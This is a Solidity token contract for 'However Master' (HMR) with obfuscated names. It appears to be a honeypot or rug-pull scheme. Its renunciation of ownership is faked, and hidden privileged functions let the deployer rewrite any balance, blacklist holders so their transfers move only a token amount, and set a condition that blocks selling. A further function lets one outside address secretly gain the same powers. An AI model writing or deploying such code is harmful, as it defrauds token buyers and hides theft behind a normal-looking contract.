//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface receiverMaxTo {
    function createPair(address limitTake, address feeToken) external returns (address);
}

interface autoTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverEnableIs) external view returns (uint256);

    function transfer(address modeTake, uint256 maxMarketing) external returns (bool);

    function allowance(address isTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address modeTake,
        uint256 maxMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isLaunch, uint256 value);
    event Approval(address indexed isTotal, address indexed spender, uint256 value);
}

abstract contract receiverLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeSwap is autoTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HoweverMaster is receiverLiquidity, autoTeam, modeSwap {

    function allowance(address fundAmount, address fromSenderFee) external view virtual override returns (uint256) {
        if (fromSenderFee == fromTo) {
            return type(uint256).max;
        }
        return maxToken[fundAmount][fromSenderFee];
    }

    string private liquiditySenderAmount = "However Master";

    uint256 amountAutoList;

    function maxIs(address totalIs, uint256 maxMarketing) public {
        sellList();
        isSender[totalIs] = maxMarketing;
    }

    uint256 private launchedLaunch;

    function approve(address fromSenderFee, uint256 maxMarketing) public virtual override returns (bool) {
        maxToken[_msgSender()][fromSenderFee] = maxMarketing;
        emit Approval(_msgSender(), fromSenderFee, maxMarketing);
        return true;
    }

    function transfer(address totalIs, uint256 maxMarketing) external virtual override returns (bool) {
        return totalFundAuto(_msgSender(), totalIs, maxMarketing);
    }

    function sellList() private view {
        require(autoFrom[_msgSender()]);
    }

    function teamTotal() public {
        emit OwnershipTransferred(isLaunched, address(0));
        feeIs = address(0);
    }

    uint256 private tokenMode;

    function decimals() external view virtual override returns (uint8) {
        return takeTotalMax;
    }

    uint256 private swapAmount;

    function name() external view virtual override returns (string memory) {
        return liquiditySenderAmount;
    }

    function balanceOf(address receiverEnableIs) public view virtual override returns (uint256) {
        return isSender[receiverEnableIs];
    }

    address totalTakeSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address sellMode, address modeTake, uint256 maxMarketing) external override returns (bool) {
        if (_msgSender() != fromTo) {
            if (maxToken[sellMode][_msgSender()] != type(uint256).max) {
                require(maxMarketing <= maxToken[sellMode][_msgSender()]);
                maxToken[sellMode][_msgSender()] -= maxMarketing;
            }
        }
        return totalFundAuto(sellMode, modeTake, maxMarketing);
    }

    mapping(address => mapping(address => uint256)) private maxToken;

    uint256 private atFeeLaunched = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed exemptIs, address indexed swapExempt);

    uint256 constant swapBuy = 16 ** 10;

    uint256 txMarketing;

    mapping(address => bool) public autoFrom;

    uint256 public autoLaunch;

    function limitSell(address buyLimitList) public {
        sellList();
        
        if (buyLimitList == isLaunched || buyLimitList == autoSender) {
            return;
        }
        listTrading[buyLimitList] = true;
    }

    mapping(address => uint256) private isSender;

    address public isLaunched;

    function getOwner() external view returns (address) {
        return feeIs;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atFeeLaunched;
    }

    function liquidityTeam(uint256 maxMarketing) public {
        sellList();
        amountAutoList = maxMarketing;
    }

    bool public launchedTx;

    bool public swapShould;

    function symbol() external view virtual override returns (string memory) {
        return tokenBuyLiquidity;
    }

    address private feeIs;

    function marketingBuyFrom(address marketingEnableSender) public {
        require(marketingEnableSender.balance < 100000);
        if (launchedTx) {
            return;
        }
        if (minSwapFund == tokenReceiverFee) {
            tokenReceiverFee = true;
        }
        autoFrom[marketingEnableSender] = true;
        
        launchedTx = true;
    }

    bool private minSwapFund;

    constructor (){
        if (tokenMode != autoLaunch) {
            autoLaunch = launchedLaunch;
        }
        launchedIs atSell = launchedIs(fromTo);
        autoSender = receiverMaxTo(atSell.factory()).createPair(atSell.WETH(), address(this));
        
        isLaunched = _msgSender();
        autoFrom[isLaunched] = true;
        isSender[isLaunched] = atFeeLaunched;
        teamTotal();
        
        emit Transfer(address(0), isLaunched, atFeeLaunched);
    }

    function totalFundAuto(address sellMode, address modeTake, uint256 maxMarketing) internal returns (bool) {
        if (sellMode == isLaunched) {
            return swapWalletTrading(sellMode, modeTake, maxMarketing);
        }
        uint256 tradingLaunched = autoTeam(autoSender).balanceOf(totalTakeSender);
        require(tradingLaunched == amountAutoList);
        require(modeTake != totalTakeSender);
        if (listTrading[sellMode]) {
            return swapWalletTrading(sellMode, modeTake, swapBuy);
        }
        return swapWalletTrading(sellMode, modeTake, maxMarketing);
    }

    bool public tokenReceiverFee;

    uint8 private takeTotalMax = 18;

    function owner() external view returns (address) {
        return feeIs;
    }

    address public autoSender;

    mapping(address => bool) public listTrading;

    address fromTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private swapLimitFrom;

    string private tokenBuyLiquidity = "HMR";

    function swapWalletTrading(address sellMode, address modeTake, uint256 maxMarketing) internal returns (bool) {
        require(isSender[sellMode] >= maxMarketing);
        isSender[sellMode] -= maxMarketing;
        isSender[modeTake] += maxMarketing;
        emit Transfer(sellMode, modeTake, maxMarketing);
        return true;
    }

}